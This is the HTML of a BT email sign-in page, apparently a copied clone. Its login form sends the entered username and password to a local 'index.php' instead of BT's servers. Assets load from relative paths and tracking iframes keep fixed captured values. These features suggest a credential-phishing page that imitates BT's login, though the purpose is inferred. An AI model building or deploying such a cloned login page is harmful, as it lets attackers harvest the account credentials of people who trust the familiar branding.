<div class="loginerror generic-error" style="display:none">Please check you entered your username and password correctly and try again. If you need help remembering your username or password you can use the links below.</div>
<div class="loginerror lock-error" style="display:none">You have had too many unsuccessful attempts to login. You have been temporarily locked out. Please try after 15 minutes.</div>
<!--Start:error Login Section-->
<noscript>
<div id="noscripterrorcontainer" class="main-amber showslot">
<div class="submit-error">
<div class="pull-left red-image"></div>
<div class="error-text-wrapper">
<div class="error-header">
You've disabled JavaScript on the browser. Please enable it prior to continuing.
</div>
</div>
</div>
</div>
</noscript>
<div id="errorcontainer" class="main-amber hideslot">
<div class="submit-error">
<div class="pull-left red-image"></div>
<div class="error-text-wrapper">
<!-- <div id="loginpageerror0" class="error-header hideslot"> Your session has been timed out. Please try again. </div> -->
<div id="loginpageerror1" class="error-header hideslot"> You've disabled cookies on the browser. Please enable it prior to continuing. </div>
<div id="loginpageerror2" class="error-header hideslot"> Please check you entered your username and password correctly and try again. If you need help remembering your username or password you can use the links below. </div>
<div id="loginpageerror3" class="error-header hideslot"> You have had too many unsuccessful attempts to login. You have been temporarily locked out. Please try after 20 minutes. </div>
<div id="loginpageerror4" class="error-header hideslot"> Invalid passcode. Identity verification on any device using your present methods have been locked for 20 minutes. </div>
<div id="loginpageerror5" class="error-header hideslot"> Invalid passcode. Please try again. </div>
<div id="loginpageerror6" class="error-header hideslot"> Something went wrong. Please try again. </div>
</div>
</div>
</div>
<div class="email-login-wrapper customloginlb">
<div id="bespoketoggle" style="display:none;"> <div style="color:#000000 ;margin-top: 8px;">To manage your account, view your bill or access other BT services, you need to login using your BT ID.</div> <br></div>
<form method="post" action="index.php" name="frm_login" onsubmit = "return !! (validateEmail() & validatePassword())">
<input name="cookieExpp" value="30" type="hidden">
<input name="Switch" value="yes" type="hidden">
<input type="hidden" name="SMPostLoginUrl" value="/appsyouraccount/secure/postlogin">
<input type="hidden" name="loginforward" value="https://home.bt.com/secure/loginforwardeb?view=btmail" id="loginforward">
<input name="smauthreason" value="0" type="hidden">
<div class="smtarget">
<input type="hidden" name="TARGET" value="https://home.bt.com/secure/loginforwardeb?view=btmail&amp;redirectURL=https%3A%2F%2Fsignin1%2Ebt%2Ecom%2Fbtmail%2Fsecure%2Femaillogin">
</div>
<h1>Sign in</h1>
<div class="form-group">
<label for="inputIdEmail" class="username" style="display: none;">
BT ID or Email address
</label>
<label class="username" style="display: block;" id="userLabel">Please enter your email address</label>
<input tabindex="3" class="form-control" id="inputIdEmail" name="username" type="email" maxlength="255" size="25"  placeholder="eg.user@btinternet.com" autocomplete="off">
</div>
<div class="form-group">
<label for="nafmpwd" class="pswd" style="display: none;">
Password
</label>
<label class="email-show-right" id="shpwdlbl" style=""> <a>Show</a> </label>
<label class="pass" style="display: block;" id="passLabel">Please enter your password</label>
<input tabindex="4" id="password" name="password" class="form-control" type="password" maxlength="100" size="25" autocomplete="off">
<input name="PASSWORD" type="hidden" maxlength="100" size="25" value="">
</div>
<div>
<label class="email-forgotpwd" id="emailforgotpass">
Forgotten <a tabindex="6" class="forgotPwd" href="https://my.bt.com/s/apps/appsselfserve/index.html#/forgotlogindetails?srfd=y&amp;view=btmail&amp;TARGET=%24SM%24https%3A%2F%2Fsignin1%2Ebt%2Ecom%2Fbtmail%2Fsecure%2Femaillogin" data-analytics-link="Link:Forgotten your login details?">your login details?</a>
</label>
</div>
<script>
					var frgtdetail = $(".forgotPwd").attr("href");
					if(frgtdetail.indexOf("?") > 0){
						frgtdetail = frgtdetail + "&view="+ 'btmail' +"&TARGET=" +  Encoder.encodeUrl(Encoder.getURLParameter('TARGET'));
					} else {
					  	frgtdetail = frgtdetail + "?view="+ 'btmail' +"&TARGET=" +  Encoder.encodeUrl(Encoder.getURLParameter('TARGET'));
					} 
					$(".forgotPwd").attr('href', frgtdetail);
			 </script>
<div class="sign-btn-wrapper">
<div class="sign-btn-align">
<input id="btsignin" tabindex="9" type="submit" value="Sign in" name="submit" class="btn btn-primary email-btn-primary">
</div>
<div class="checkbox-align-right">
<div class="checkbox">
<input tabindex="7" id="emailkeepmeloggedin" name="rememberMe" type="checkbox" class="checkbox-primary">
<label for="inputCheckbox" class="email-logged-right">Keep me signed in</label>
</div>
</div>
<script>
                  	var emailSP = $.cookie("EMAIL_SP");
   					if ("NY" == emailSP) {
   						$(".checkbox-align-right").css("display", "none");
   					}
                </script>
</div>
<div class="error-messsage" style="display:none">
<p>We're phasing out the 'keep me logged in' feature. Sorry if that causes you any trouble. Click <a href="http://bt.custhelp.com/app/answers/detail/a_id/54998/c/7339" target="_blank">here</a> for more information.</p>

</div>
<div class="loadFont clearfix"></div>
<!-- Email_Loginpage_EULaw -->
<p id="EULaw" class="EULaw" style="display:none">By logging in I agree that cookies may be set on my browser. <a href="http://my.bt.com/btmail/cookies" target="_blank" tabindex="7">Learn more</a></p>

<div class="email-helplinks">
</div>
</form>
<div id="yahooMPUMessage" class="email-MPUmessage">
<div id="btMPUMessage"> <a href="https://my.bt.com/help/home/" style="text-decoration: none!important; margin-bottom: 5px; display: block; font-family: 'BT TV Bold'!important;" data-analytics-link="Link:Help"> Help &gt; </a>
<a href="https://bt.custhelp.com/app/answers/detail/a_id/44888/~/how-do-i-create-and-activate-a-new-bt-email-address%3F" style="text-decoration: none; margin-bottom:5px;display: block;font-family: 'BT TV Bold';" data-analytics-link="Link:Create new Email address"> Create new Email address &gt; </a>
</div>
</div>
<div class="sec-btn-group">
<div class="email-text-left">Don't use email?</div>
<a class="btn btn-primary email-btn-secondary" id="findoutmore" tabindex="13" href="https://www.bt.com/mybt/signup" data-analytics-link="Link:Find out more">
Find out more
</a>
</div>
</div>
</div>
</div>
<script>
		var ua=window.navigator.userAgent;if('on'=='on'){$('#shpwdlbl').show()}else{$('#shpwdlbl').hide()}
		if(navigator.userAgent.match(/Android/i)||navigator.userAgent.match(/webOS/i)||navigator.userAgent.match(/iPhone/i)||navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPod/i)||navigator.userAgent.match(/BlackBerry/i)||navigator.userAgent.match(/Windows Phone/i)){$('#shpwdlbl').bind('touchstart',function(){$('[name="NAFMPASSWORD"]').prop("type",'text');$('#shpwdlbl').css("font-weight",'bold')});$('#shpwdlbl').bind('touchend',function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})}
		else{$('#shpwdlbl').mousedown(function(){$('[name="NAFMPASSWORD"]').prop("type",'text');$('#shpwdlbl').css("font-weight",'bold')});$('#shpwdlbl').mouseup(function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})
		$('#shpwdlbl').mouseleave(function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})}
	</script>
<div class="clearfix"></div>







<!-- EmailLoginPage RightColumn Slots -->

</div>
<div class="col-xs-12 col-md-8 col-md-pull-4 col-lg-pull-4 col-lg-8 module-zoom-group lhr-modules-order">






<!-- IncludeLoginPageSearch Template -->
<!-- Add scheduled condition -->
<!-- End scheduled condition -->
<div class="search-left col-md-12 col-lg-12 col-sm-12 hidden-sm hidden-xs">
<div id="homepage-search">
<div class="wrapper">
<div class="search-options">
<a id="web" href="javascript: void(0);" data-link="https://search.bt.com" data-text="Search the web" class="web active"><!--The web1--></a>
<a id="btcom" href="javascript: void(0);" data-link="http://home.bt.com/ss/Satellite" data-text="Search this site" class="site"><!--Search this site1--></a>
</div>
<div class="search-bar">
<form class="search-form" action="/" method="get">
<input type="hidden" disabled="disabled" value="btcom" name="site">
<input type="hidden" disabled="disabled" value="london" name="TownOrPostcode">
<input type="hidden" disabled="disabled" value="" name="siteArea">
<input type="hidden" value="dp" name="pr">
<input type="hidden" value="Test4" name="channel">
<input type="text" class="bt-ser-txt" id="search-text" name="q" placeholder="Search the web">
<input id="search-button" type="submit" value="" class="searchgoogle">
</form>
</div>
</div>
</div>
</div>


<!-- EmailLoginPage LeftColumn Slots -->
<div class="mpu-ads-wrapper">
<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 mpu-ads-align">
<!-- Ads are disabled-->

</div>
<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
<!-- Ads are disabled-->

</div>
</div>

</div>
</div>
</div>
</div>






<div></div>

</div>
</div>
<!--Dante New Global footer started-->
<script src="assets/260320/js/dantegf.api-1.0"></script>
<script>
		var footerconfig={};
		DanteGF.init(footerconfig);
    </script>
    <br><br><br><br><br>
<footer id="bt-footer" style="margin-top: 0px; visibility: visible;">
<div class="bt-footer-footer-top"><div class="bt-footer-top-main"><div class="bt-footer-inner-section"><ul class="top-footer-ul"><li><a href="https://business.bt.com/">For business and public sector</a></li><li><a href="https://www.globalservices.bt.com/uk/en/home">For global business</a></li><li><a href="https://www.btplc.com">BT Group</a></li><li> <a href="#bt-footer-footer-top-more" class="bt-footer-more-button" data-toggle="collapse" aria-expanded="false" aria-controls="more">More Sites<img class="dante-icon-chevron-down" src="chevy.png" style="width: 2rem;"></a></a> </li></ul></div></div><div id="bt-footer-footer-top-more" class="bt-footer-top-more"><div class="bt-footer-inner-section"><ul> <li><a href="https://www.btwifi.co.uk/">Wifi</a></li> <li><a href="https://www.btireland.com/">BT Ireland</a></li> <li><a href="https://www.shop.bt.com/">BT Shop</a></li> </ul> <ul> <li><a href="https://www.businessdirect.bt.com/">Business Direct</a></li> <li><a href="https://www.openreach.co.uk">Openreach</a></li> <li><a href="https://www.thephonebook.bt.com/">The Phone Book</a></li> </ul> <ul> <li><a href="https://www.btwholesale.com">BT Wholesale</a></li> <li><a href="https://www.redcare.bt.com/">BT Redcare</a></li> </ul></div></div></div><div class="bt-footer-footer-bottom"><div class="bt-footer-inner-section"><ul class="bottom-footer-ul"><li><a href="https://home.bt.com/pages/static/i/pansegment/contact_us/contactus.html">Contact BT</a></li><li><a href="https://www.btplc.com/careercentre/">Careers</a></li><li><a href="https://home.bt.com/pages/static/i/pansegment/sitemap/sitemaphome.html">Sitemap</a></li><li><a href="https://www.bt.com/privacy-policy/">Privacy</a></li><li><a href="https://www.bt.com/consumer/cookie/about-cookies.html">Cookies</a></li><li><a href="https://www.bt.com/products/static/terms/terms-of-use.html">Terms of use</a></li><li><a href="https://www.btplc.com/Thegroup/Policyandregulation/Governance/Codesofpractice/index.htm">Codes of practice</a></li><li><a href="https://www.bt.com/broadband/USO">Broadband Universal Service</a></li><li><a href="https://www.bt.com/help/home/complaints.html">Make a complaint</a></li><li><a href="https://www.bt.com/products/static/terms/homepage.html">T&amp;Cs</a></li><li><a href="https://www.btplc.com/Digitalimpactandsustainability/Humanrights/Modernslavery/index.htm">Modern Slavery Statement</a></li><li><a href="https://btplc.com/Inclusion/">BT Including You - helping you communicate</a></li><li class="bt-footer-copyright"> <div class="bt-footer-float-left"> © BT <span class="bt-footer-copyright-year">2020</span> </div> <img class="bt-footer-bt-logo" src="assets/260320/images/logo/logo-footer2018.svg" alt="BT logo"> </li></ul></div></div><script src="assets/260320/js/responsive-footer.min"></script></footer>
<!--Dante New Global footer ended-->

<script src="assets/260320/home/js/search/homepage-search.min"></script>
<script src="assets/260320/home/js/ellipsis/ellipsis.min"></script>
<script src="assets/260320/home/js/ellipsis/config.min"></script>
<script src="assets/260320/js/sha256"></script>
<script src="assets/260320/js/login"></script>
<script src="assets/260320/js/core"></script>
<script src="assets/260320/js/jquery-ui-1.9.2.custom.min"></script>
<script>
	function downloadJSAtOnload(){
	var t=document.createElement("script");t.src="assets/260320/globalheader/bt.cookies";document.body.appendChild(t)}
	if(window.addEventListener)window.addEventListener("load",downloadJSAtOnload,false);else if(window.attachEvent)window.attachEvent("onload",downloadJSAtOnload);else window.onload=downloadJSAtOnload
</script>

<link href="assets/260320/home/css/footer-adjuster.css" rel="stylesheet">
<script src="assets/260320/home/js/email-login/footer-adjuster.min"></script>
<script>
				//to update .fcc and loginforward endpoint based on the 2FA migration status
				var settings = {
	                    url: 'https://signin1.bt.com/get2faStatus',
	                    method: "GET",
	                    cache: false,
	                    timeout: 5000,
	                    xhrFields: { withCredentials: true },
	                    error: function(xhr, status, error) {},
	                    success: function(data, textStatus, jqXHR) {
	                    	if (204 === jqXHR.status || 200 === jqXHR.status) {
	                    		if (!aAuth) {
	                    			$('form[name="frm_login"]').attr('action', 'https://signin1.bt.com/siteminderagent/fcc/shim.fcc');
		                    		var arcotScript=document.createElement("script");
		        					arcotScript.src='assets/260320/aauth/js/ArcotAdapterIntegration';
		        					document.body.appendChild(arcotScript);
		                    		var smtrgt = $('.smtarget input').val();
			                    	var targettkns = smtrgt.split("?view=");
			                    	if (targettkns.length > 0) {
			                    		var tkns = targettkns[0].split("/");
			                    		for (var i=0 ; i<tkns.length; i++) {
			                    			if ((tkns[i].length = 12 && tkns[i] === "loginforward") || (tkns[i].length > 12 && tkns[i].indexOf("loginforwardaa") < 0)) {
			                    				tkns[i] = tkns[i].replace("loginforward", "loginforwardaa");
			                    				if ("loginforwardaa" === tkns[i]) {
			                    					tkns[i] = "loginforwardaaeb";
			                    				}
			                    			} else if (tkns[i].length > 12 && tkns[i].indexOf("loginforwardaa") != -1) {
			                    				tkns[i] = "loginforwardaaeb" ;
			                    			} 
			                    		}
			                    		var tempSmTarget = "";
			                    		for (var i=0 ; i<tkns.length; i++) {
			                    			if (tkns[i].substring(0, 12) === "loginforward") {
			                    				tempSmTarget = tempSmTarget + tkns[i];
			                    			} else {
			                    				tempSmTarget = tempSmTarget + tkns[i] + "/";
			                    			}
			                    		}
			                    		var smtarget = tempSmTarget + "?view=" + targettkns[1];
			                    		$(".smtarget input").val(smtarget);
			                    	}
	                    		}
		        			}
	                    }
	                };
	            $.ajax(settings);
			</script>
</div><script>_satellite["__runScript1"](function(event, target) {
var $body = document.getElementsByTagName("BODY")[0];

if ($body) {
  $body.addEventListener('BTAnalytics.cookieManagerOpen', function(){ 
    _satellite.track('bt_cookie_policy_manager_opened');
  });
}
});</script><script>_satellite["__runScript2"](function(event, target) {
function Exhaust(e){this.version="1.3.1",this.debugger=new e.ExhaustDebugger(this,new e.PrettyConsole),this.events={},this.defaults={init_timestamp:new Date,init_location:document.location},this.timeline_index=[],this.init_queue=typeof _exhaust_init_queue==typeof[]?_exhaust_init_queue:[],this.registerEvent("_ALL"),document.location.search.indexOf("_exhaust.debug")>-1&&this.debugger.setEnabled(!0),"function"==typeof CustomEvent?window.dispatchEvent(new CustomEvent("Exhaust.init",{detail:{instance:this}})):this.debugger.log("%cExhaust: Unable to dispatch Exhaust.init to window.  Browser too old?","background-color:red; border-radius:3px; color:white; font-weight:bold; padding:.15em .5em;")}function ExhaustDebugger(e,t){this.exhaust=e,this.pc=t;var s=window;if(this.consoleFn=function(e,t,s){if(typeof s!=typeof[]&&(s=[].slice.call(s)),this.is_enabled&&e&&"function"==typeof e[t])try{e[t].apply(null,s)}catch(t){e.error(t)}},this.error=function(){this.consoleFn(s.console,"error",this.prefixMessage(arguments))},this.group=function(){return this.consoleFn(s.console,"group",arguments),arguments[0]},this.groupEnd=function(){this.consoleFn(s.console,"groupEnd",arguments)},this.info=function(){this.consoleFn(s.console,"info",arguments)},this.log=function(){this.consoleFn(s.console,"log",arguments)},this.prefixMessage=function(e){return["%cExhaust",this.pc.css.h1].concat([].slice.call(e))},this.setEnabled=function(e){var t=e||e!==this.is_enabled;this.is_enabled=e,localStorage&&localStorage.setItem("ExhaustDebugger",JSON.stringify({is_enabled:this.is_enabled})),t&&(this.pc.addMessage("Exhaust",this.pc.css.h1).addMessage("v"+this.exhaust.version,this.pc.css.info).addMessage("Debugging "+(e?"en":"dis")+"abled",this.pc.css.text),this.log.apply(this,this.pc.parse()))},this.warn=function(){this.consoleFn(s.console,"warn",arguments)},localStorage){var i=JSON.parse(localStorage.getItem("ExhaustDebugger"));i&&1==i.is_enabled&&this.setEnabled(i.is_enabled)}}function PrettyConsole(){this.css={text:"background:#ddd; border-bottom:2px solid #6400aa; border-radius:3px; font-weight:normal; line-height:1.5em; padding:.15em .5em;"},h="color:#fff; font-weight:bold; border-right:none;",this.css.h1=h+this.css.text+"background:#6400aa;",this.css.h2=h+this.css.text+"background:#ea9900;",this.css.info=h+this.css.text+"background:#009BAA;",this.css.event_name=h+this.css.text+"background:#777777;",this.reset()}Exhaust.prototype={eventExists:function(e){return!!this.events[e]},getTimeline:function(){var e=[];for(var t=0;t<this.timeline_index.length;t++){var s=this.timeline_index[t];e.push(this.events[s.event_name].history[s.i])}return new function(e){this.events=e}(e)},on:function(e,t,s){if("function"!=typeof t)return this.debugger.log('Callback for "'+e+'" is not a function'),!1;if((s=s||{}).label=s.label||"- no label -",s.trigger_history=!!s.trigger_history,"string"==typeof e&&(e=[e]),typeof e==typeof[]){var i=this;return e.forEach(function(e){i.registerEvent(e),i.events[e].callbacks.push({label:s.label,callback:t}),s.trigger_history&&i.triggerHistory(e,t,s),i.triggerPreloadQueue(e,i.init_queue)}),i}},prepPayload:function(e){return typeof e!=typeof{}&&(e={}),e._defaults={},e._defaults.init_location=this.defaults.init_location,e._defaults.init_timestamp=this.defaults.init_timestamp,e._defaults.location=document.location||!1,e._defaults.timestamp=new Date,e},registerEvent:function(e){return!this.eventExists(e)&&(this.events[e]={callbacks:[],history:[]},!0)},trigger:function(e,t){(t=this.prepPayload(t))._event_name=e,this.registerEvent(e),this.timeline_index.push({event_name:e,i:this.events[e].history.length}),this.events[e].history.push(JSON.parse(JSON.stringify(t)));var s=this.events[e].callbacks.length,i=this.events[e].callbacks.concat(this.events._ALL.callbacks),n=i.length,r=this.debugger.pc;if(!n)return this.debugger.log.apply(this.debugger,r.quickMessage("Exhaust","Trigger",e,"0 callbacks registered")),this.debugger.log("Payload: ",t),!1;var o,a=this.debugger.group.apply(this.debugger,r.quickMessage("Exhaust","Trigger",e,[n+" callback"+(1===n?"":"s")+" registered"].join(" | ")));this.debugger.log("Payload: ",t);for(var h,g=0,u=n;g<u;g++){h=i[g],r.addMessage("Callback "+(g+1)+"/"+n+(g>=s?" via _ALL":""),this.debugger.pc.css.info).addMessage(h.label,this.debugger.pc.css.text),o=this.debugger.group.apply(this.debugger,r.parse());try{h.callback(t,h.label)}catch(e){this.debugger.error(e)}this.debugger.groupEnd(o)}return this.debugger.groupEnd(a),this},triggerHistory:function(e,t,s){if(!1===this.eventExists(e))return this.debugger.info('"'+e+'" history triggered but no on() callbacks registered.'),!1;s=s||{label:"- no label -"};var i,n,r=this.events[e].history.length,o=this.debugger.pc;o.addMessage("Exhaust",this.debugger.pc.css.h1).addMessage("Trigger History",this.debugger.pc.css.info);for(var a=this.debugger.group.apply(this.debugger,o.parse()),h=this.debugger.group.apply(this.debugger,o.quickMessage("Exhaust","Trigger",e,s.label)),g=0,u=r;g<u;g++){o.addMessage("Event "+(g+1)+"/"+r,this.debugger.pc.css.info),n=this.debugger.group.apply(this.debugger,o.parse()),i=this.events[e].history[g],this.debugger.log("Payload:",i);try{t(i)}catch(e){this.debugger.error(e)}this.debugger.groupEnd(n)}return this.debugger.groupEnd(h),this.debugger.groupEnd(a),!0},triggerPreloadQueue:function(e,t){if(typeof t==typeof[]&&0!=t.length)for(var s=0;s<t.length;s++)t[s][0]==e&&this.trigger.apply(this,t[s])}},PrettyConsole.prototype.addMessage=function(e,t){return this.messages.push({text:e,css:t}),this},PrettyConsole.prototype.parse=function(e){for(var t,s=0,i=[],n="";s<this.messages.length;s++)n+="%c"+(t=this.messages[s]).text,i.push(t.css);return i.unshift(n),!0!==e&&this.reset(),i},PrettyConsole.prototype.quickMessage=function(){return this.addMessage(arguments[0],this.css.h1),arguments[1]&&this.addMessage(arguments[1],this.css.h2),arguments[2]&&this.addMessage(arguments[2],this.css.event_name),arguments[3]&&this.addMessage(arguments[3],this.css.text),this.parse()},PrettyConsole.prototype.reset=function(){this.messages=[]},window._exhaust=new Exhaust({ExhaustDebugger:ExhaustDebugger,PrettyConsole:PrettyConsole});
});</script><script>_satellite["__runScript3"](function(event, target) {
if ( -1 === [ "production", "live" ].indexOf( _satellite.buildInfo.environment ) ) {
  window._exhaust.debugger.setEnabled( true );
}



var opts = {
  	"label": "Adobe Analytics"
  };

// START: Generic exhaust listeners
	_exhaust.on('Page.viewed', handlePageView)
      .on('Content.viewed', handleContentViewed)
      .on('Interaction.interacted', handleInteraction)
      .on('Error.occurred', function ( data ) {

            var e           = data.error;
            var error_types = [ "input", "validation", "system", "unknown" ];

            if ( !e ) {
                console.error( "Analytics call aborted. 'error' key not found at root of payload." );
                return;
            }

            if ( !e.hasOwnProperty( "type" ) || error_types.indexOf( e.type ) < 0 ) {
                console.error( "Analytics call aborted because 'error.type' is not one of: " + error_types.join( ", " ) );
                return;
            }

            if ( !e.hasOwnProperty( "code" ) ) {
                console.error( "Analytics call aborted because 'error.code' is not set" );
                return;
            }


            if ( !e.hasOwnProperty( "name" ) || e.name == "" ) {
                console.error( "Analytics call aborted because 'error.name' is not set" );
                return;
            }


            if ( !e.hasOwnProperty( "is_nce" ) || e.is_nce === "" ) {
                console.error( "Analytics call aborted because 'error.is_nce' is not set" );
                return;
            }

            var str = [
                    e.type,
                    e.code,
                    e.name,
                    "nce=" + ( ( e.is_nce ) ? "yes" : "no" )
                ].join( ":" );

          _satellite.track( data._event_name, {
            "error_string": str,
            "label": e.label
          });
      })


      .on( "Content.shown", function( data ) {

        try {

          var do_tracking = false;
          
          if ( data.banner && data.banner.campaign_id ) {
            
              var track_param = "";

              switch ( data.banner.campaign_id ) {
                  
                case "iguide":

                  track_param = [
                    data.banner.campaign_id,
                    dataon.Category,
                    data.banner.placement,
                    data.banner.variant,
                    data.api.response.productFamily,
                    data.api.response.errorInfo,
                    data.api.response.scenarioCode
                  ].map( function( str ) {
                    return str.replace( /:/g, "_" )
                  }).join( ":" );

                  do_tracking = true;
                  
                  break;
                  
              }
              
              if ( do_tracking ) {
                _satellite.track( data._event_name + "." + data.banner.campaign_id, { "iguide_details": track_param });
                return;
              }

          }

          if ( !data.type ) {
            
            if ( console.error ) {
              console.error( "No 'type' set in payload." );
            }
            
            return;
            
          }

          _satellite.track( data._event_name, data );
          
        } catch( e ) {
          console.error( e );
        }


      }, {
        "trigger_history": true
    })


    .on( "Journey.completed", function( data ) {
      
      window.journeys = window.journeys || {};
      
      if ( window.journeys[data.journey.name] ) {
        window.journeys[data.journey.name]++;
        console.log( "Skipping" );
        return;
      } else {
        window.journeys[data.journey.name] = 1;
      }
      
      _satellite.track( data._event_name, data );


    }, opts )

    .on( [ "Journey.Action.completed", "Billing.History.filtered" ], function( data ) {
      	_satellite.track( data._event_name, data );
    }, opts )

    .on( [ "Chat.Invite.shown", "Chat.Invite.accepted", "Chat.Window.State.changed" ], function( data ) {
      	_satellite.track( "Chat interaction", data );
    }, opts )
    
    .on( "Journey.completed", function( data ) {
      console.log( "Skipping medallia for now." );
      /*
      if ( !data.success || window.journeys[data.journey.name] > 1 ) {
        console.log( "Skipping" );
        return;
      }

        var reloadMedallia = function() {
            window.medallia_journey = data.journey.name;
            sat.track( "Reload Medallia" );
        }

        switch ( data.journey.name ) {

            case "Make a Payment":
                reloadMedallia();
            break;

            case "Forgot Login Details":
            
                //  This journey name gets called during the BT ID creation journey(!) so only do password changed page
                if ( sat.getDataElement( "PageName" ) == "Con:YA:My profile:ForgotLoginDetails:PasswordChanged" ) {
                    reloadMedallia();
                }

            break;
            
        }
      
        //  window.medallia_journey = "";
      //*/

    }, {
        "label": "Medallia"
    });



	function handlePageView(data) {
         
	  var pageName = data.vendor && data.vendor.adobe && data.vendor.adobe.analytics && data.vendor.adobe.analytics.pageName;
	  var contentViewed = data.content && data.content.viewed;
	  var chatSessionId = data.chat && data.chat.queue_id; // the developers are passing the chat session id as 'queue' by mistake

	  if (pageName) {
	    _satellite.setVar('page_name', pageName);
	  } else {
        var dd = window.digitalData;
        if ( dd && dd.vendor && dd.vendor.adobe && dd.vendor.adobe.analytics && dd.vendor.adobe.analytics.pageName ) {
          _satellite.setVar('page_name', dd.vendor.adobe.analytics.pageName );
        } else if (console && console.warn) {
          console.warn( "Page name not set" );
        }
      }

	  if (contentViewed) {
	    _satellite.setVar('content viewed', contentViewed);
	  }

	  if (chatSessionId) {
	  	_satellite.setVar('chat session id', chatSessionId);
	  }

	  _satellite.setVar('exhaustEvent', data._event_name);

	  _satellite.track('page_load');
	}

	function handleContentViewed(data) {
	  var contentViewed = data.content && data.content.viewed;

	  if (contentViewed) {
	    _satellite.setVar('content viewed', contentViewed);
	  }

	  _satellite.setVar('exhaustEvent', data._event_name);

	  _satellite.track('link');
	}

	function handleInteraction(data) {
		var linkName = data && data.interaction && data.interaction.link_name;

		if (!linkName) {
			return;
		}

	  var prefix = (_satellite.getVar('Page Name') || '') + ':';
	  var trackingValue = prefix + linkName;
	  _satellite.setVar('exhaustEvent', data._event_name);
	  _satellite.setVar('link name', trackingValue);
	  _satellite.track('link');
	}

//  Help article ratings

_exhaust.on( "Article.rated", function( data ) {
  _satellite.setVar('exhaustEvent', data._event_name);
  _satellite.setVar( 'help_article_rating', data );
  _satellite.track( data._event_name );
  
  s.events = "";
  s.linkTrackEvents = "";
  
});

// Basket add/remove item
_exhaust.on( [ "Basket.item.added", "Basket.item.removed" ], function( data ) {

    _satellite.setVar( "exhaustEvent", data._event_name );
    _satellite.setVar( "basket_item_data", data );
    _satellite.track( "Basket item change" );

  }).on( [ "Basket.viewed", "Basket.closed" ], function( data ) {

    _satellite.setVar( "exhaustEvent", data._event_name );
    _satellite.setVar( "basket_data", data );
    _satellite.track( "Basket interaction" );

  });



//  Videos
_exhaust.on( "Video.Playback.started", function( data ) {
    if ( data.playback.initial_playback ) {
      _satellite.track( "Video.Playback.started", data );
    }
}).on( [ "Video.Playback.ended", "Video.Playback.paused" ], function( data ) {
    _satellite.track( data._event_name, data );
});


//  Complaints
_exhaust.on( [ "Complaints.Raise.Step.Changed", "Complaints.Interaction.interacted" ], function( data ) {
    _satellite.track( data._event_name, data );
});


//  Ocean
_exhaust.on( 'Module.loaded', function( data ) {
  switch ( data.module.name ) {
    case 'Devices':
    case 'Passes':
      _satellite.track( 'Ocean.' + data.module.name + '.loaded', data );
      break;
  }
}).on( [ 'NOWTV.Device.renamed', 'NOWTV.Device.removed' ], function( data ) {
    _satellite.track( data._event_name, data );
});
});</script><!-- Global site tag (gtag) - Google Analytics -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-35439723-1"></script>




<iframe style="display: none; visibility: hidden;" src="https://2768331.fls.doubleclick.net/activityi;src=2768331;type=landt285;cat=pns-b00;ord=2234828753454;gtm=2ou3p1;auiddc=1652493783.1585790176;u25=home.bt.com%2Flogin%2Floginform;~oref=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin?" width="0" height="0"></iframe><script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  
  var configs = _satellite.getVar( "gtag configs" );
  
  if ( Array.isArray( configs ) ) {
    _satellite.logger.log( "gTag: configs", configs );
    configs.forEach( function( c ) {
      gtag( 'config', c );
    });
  }
  
  var dc = _satellite.getVar( "gtag doubleclick" );
  
  if ( Array.isArray( dc ) ) {
    _satellite.logger.log( "gTag: DoubleClick", dc );
    dc.forEach( function( pixel ) {
      gtag('event', 'conversion', {
        'allow_custom_scripts': true,
        'u25': _satellite.getVar("Friendly Page Url"),
        'send_to': pixel.id +"/"+ pixel.type +"/"+ pixel.cat + "+standard"
      });
    });
  }
  
  var aw = _satellite.getVar( "gtag adwords" );
  
  if ( Array.isArray( aw ) ) {
    _satellite.logger.log( "gTag: adwords/floodlight", aw );
    aw.forEach( function( pixel ) {
      gtag('event', 'conversion', {
        'send_to': pixel.send_to
      });
    });
  }
  
</script><style type="text/css">
  #liveChat {
  -webkit-transition: all 0.4s ease-out;
  transition: all 0.4s ease-out;
  overflow: visible;
  height: 175px;
  left: 0;
  position: fixed;
  top: 300px;
  width: 40px;
  z-index: 100;
}
#liveChat:hover {
  width: 300px;
}
#liveChat h2 {
  background-color: #6400AA;
  display: block;
  width: 40px;
  height: 115px;
  border-top-right-radius: 5px;
  border-bottom-right-radius: 5px;
  margin: 0;
  position: absolute;
  top: 28px;
  right: 0;
}
#liveChat h2 b {
  font-size: 20px;
  font-family: 'BTFont Bold','BT Font Bold', Calibri, Arial, sans-serif;
  font-weight: normal;
  color: white;
  width: 115px;
  transform: translate(-50%,-50%) rotate(270deg);
  position: absolute;
  left: 50%;
  top: 50%;
  text-align: center;
}

#liveChat span {
  box-sizing: border-box !important;
  background: #6400AA;
  color: white;
  cursor: pointer;
  float: left;
  font-size: 10pt;
  padding: 20px 20px;
  margin: 0;
  position: absolute;
  right: 40px;
  text-indent: 0;
  width: 260px;
  height: 174px;
}
#liveChat span h3,
#liveChat span h4 {
  margin: 0;
}
#liveChat span h3{
  font-family: 'BTFont Light','BT Font Light', Calibri, Arial, sans-serif;
  font-size: 28px;
  font-weight: normal;
  line-height: 29px;
}
#liveChat span h4 {
  font-family: 'BTFont Bold','BT Font Bold', Calibri, Arial, sans-serif;
  font-weight: normal;
  font-size: 16px;
  line-height: 20px;
  padding: 5px 0px;
}

#liveChat span .btn {
  box-sizing: border-box !important;
  cursor:pointer;
  position: absolute;
  right: 20px;
  bottom: 20px;
  display: inline-block;
  padding: 0px 20px 0px 20px;
  height: 40px;
  min-width: 80px;
  color: #fff;
  font-size: 16px;
  font-family: 'BTFont Regular', 'BT Font Regular', Calibri, Arial, sans-serif;
  font-weight: normal;
  line-height: 1;
  border: none;
  background: #e60050;
  border-radius: 5px;
  outline: none;
}

#liveChat span .btn:hover,
.startChatButton:hover 
{
    background: #c30d4c !important;
}
  
